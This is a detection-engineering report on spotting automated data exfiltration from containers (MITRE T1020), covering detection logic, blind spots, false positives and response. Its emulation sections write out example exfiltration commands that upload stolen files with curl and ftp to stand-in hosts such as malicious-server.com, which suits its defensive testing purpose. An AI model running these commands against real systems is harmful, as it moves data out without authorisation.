# Alerting & Detection Strategy (ADS) Report

## Goal
The goal of this detection strategy is to identify adversarial attempts to bypass security monitoring using containers for automated data exfiltration.

## Categorization
- **MITRE ATT&CK Mapping:** T1020 - Automated Exfiltration
- **Tactic / Kill Chain Phases:** Exfiltration
- **Platforms:** Linux, macOS, Windows, Network  
  [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1020)

## Strategy Abstract
This detection strategy leverages multiple data sources including network traffic logs, container runtime logs, and file system monitoring to identify patterns indicative of automated exfiltration through containers. Key indicators include unusual outbound traffic from known container IP ranges, large volumes of encrypted data being transferred, and changes in container configurations or behavior that suggest exploitation.

## Technical Context
Adversaries may use containers as a stealthy medium for data exfiltration by encapsulating their payloads within legitimate-looking containerized applications. They often exploit the dynamic nature of container orchestration environments to bypass traditional security controls. Real-world execution involves configuring containers with network access and using techniques like HTTPS tunneling or encrypted FTP to securely transfer stolen data.

### Adversary Emulation Details
- **Sample Commands:**
  - Setting up a malicious Docker container:
    ```bash
    docker run --name exfiltration_container -d my_malicious_image
    ```
  - Initiating an automated script within the container to start data transfer:
    ```bash
    curl -u username:password ftp://malicious-server.com/path/to/steal/data.txt
    ```

## Blind Spots and Assumptions
- **Assumption:** All containers are managed by a centralized orchestrator (e.g., Kubernetes, Docker Swarm), allowing for comprehensive monitoring.
- **Blind Spot:** Detection might not be effective against highly sophisticated adversaries using custom container runtimes or unmonitored sidecar containers.
- **Gaps:** Limited visibility into encrypted payloads unless decryption keys or additional network inspection capabilities are available.

## False Positives
Potential false positives include:
- Legitimate use of FTP for backup services where data volumes align with typical business activity.
- Authorized outbound connections from development environments using containerized applications that might generate large, encrypted datasets as part of normal operations.
  
## Priority
**High**: Automated exfiltration poses a significant threat due to its ability to stealthily move sensitive information out of the network without detection. The impact can be severe if critical data is compromised.

## Validation (Adversary Emulation)
### IcedID Botnet HTTP PUT

1. **Environment Setup:**
   - Deploy a containerized web server using Docker.
   
2. **Simulate Exfiltration:**
   - Run the following command within the container to initiate a data transfer:
     ```bash
     curl --upload-file stolen_data.txt http://external-server.com/upload
     ```

3. **Monitor and Validate Alerts:**
   - Ensure network monitoring tools detect unusual HTTP PUT requests with large payloads from known container IPs.

### Exfiltration via Encrypted FTP

1. **Environment Setup:**
   - Set up an FTP server accessible over the network.
   
2. **Simulate Exfiltration:**
   - Execute within a container:
     ```bash
     ftp -inv $FTP_SERVER << EOF
     user username password
     put stolen_data.txt
     quit
     EOF
     ```

3. **Monitor and Validate Alerts:**
   - Check for FTP traffic anomalies, such as large file transfers or connections to suspicious IP addresses.

## Response
Upon detecting an alert:
- Immediately isolate the affected containers and network segments.
- Perform a detailed forensic analysis of the container logs and network traffic to confirm malicious activity.
- Update security policies to restrict unauthorized FTP access and outbound HTTP PUT requests from containers.
- Conduct a thorough review of all running containers for signs of compromise.
